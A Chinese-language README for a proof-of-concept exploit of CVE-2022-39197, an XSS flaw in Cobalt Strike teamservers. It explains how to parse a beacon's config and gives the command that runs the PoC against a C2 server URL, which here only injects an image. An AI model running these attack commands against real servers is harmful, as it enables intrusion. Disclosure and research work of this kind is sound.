# CVE-2022-39197-POC  

English Version [README.md](README.md) 
  
---

## 漏洞介绍
根据9.20日CobaltStrike官方发布的最新4.7.1版本的[更新日志](https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/)中介绍，<=4.7的teamserver版本存在XSS漏洞，从而可以造成RCE远程代码执行
> 一位名为“Beichendream”的独立研究人员联系我们，告知我们他们在团队服务器中发现的一个 XSS 漏洞。这将允许攻击者在 Beacon 配置中设置格式错误的用户名，从而允许他们远程执行代码RCE。

---

## POC介绍

目前POC仅可以实现teamserver弹图片。  
对于beacon的分析仍需要第三方工具（如CobaltStrikeParser等），但在之后的版本会集成进去

---

## 使用方式

详情讲解请见我的[博客](https://xzajyjs.cn/2022/09/23/CVE-2022-39197/)

![image-20220923205736931](https://serverless-page-bucket-lv779z7b-1307395653.cos.ap-shanghai.myqcloud.com/picgo/202209232057986.png)
> 参数说明  
-i 图片的url  
-u C2Server的url  
-k PUBLIC KEY文件路径

使用[CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)进行beacon分析
```
python3 parse_beacon_config.py beacon.exe --json
```
将`Port`、`C2Server`、`HttpPostUri`进行拼接获得C2Server的url, Public Key放入txt文件中
```
pip3 install -r requirements.txt
python3 cve-2022-39197-poc.py -i http://172.16.12.2:3000/logo.png -u http://172.16.12.13:8080/visit.js/submit.php -k key.txt
```
![image-20220923210117698](https://serverless-page-bucket-lv779z7b-1307395653.cos.ap-shanghai.myqcloud.com/picgo/202209232101741.png)

---

## 代码参考

https://github.com/Sentinel-One/CobaltStrikeParser
https://github.com/burpheart/CS_mock